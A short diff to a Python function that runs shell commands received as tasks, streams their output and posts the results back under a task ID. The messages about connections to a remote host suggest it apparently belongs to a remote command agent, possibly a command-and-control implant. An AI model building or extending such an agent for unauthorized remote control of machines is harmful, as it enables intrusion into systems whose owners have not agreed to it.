@@ -184,23 +184,45 @@ def execute_task(task, task_uuid):
 def execute_shell(command, task_uuid):
 
     try:
-
-        print(f"[+] Executing: {command}")
-
-        result = subprocess.check_output(
+        process = subprocess.Popen(
             command,
             shell=True,
-            stderr=subprocess.STDOUT
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            stdin=subprocess.PIPE,
+            text=True,
+            bufsize=1
         )
 
-        output = result.decode()
+        collected_output = []
+
+        try:
+            for line in process.stdout:
+                if not line:
+                    break
+                print(line, end="")
+                collected_output.append(line)
+
+            if process.poll() is not None:
+                print("[!] Connection closed by remote host.")
+
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted by user.")
+
+        finally:
+            process.kill()
+            print("[*] Connection terminated.")
+
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
 
-        post_result(output, task_uuid,executed_at)
+        # Join collected output into a single string
+        final_output = "".join(collected_output)
 
-    except subprocess.CalledProcessError as e:
+        post_result(final_output, task_uuid, executed_at)
+
+    except Exception as e:
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-        post_result("[!] Error: "+e.output.decode(), task_uuid,executed_at)
+        post_result(f"[!] Error: {str(e)}", task_uuid, executed_at)
 
 
 # 1. Move the inner function to the top level
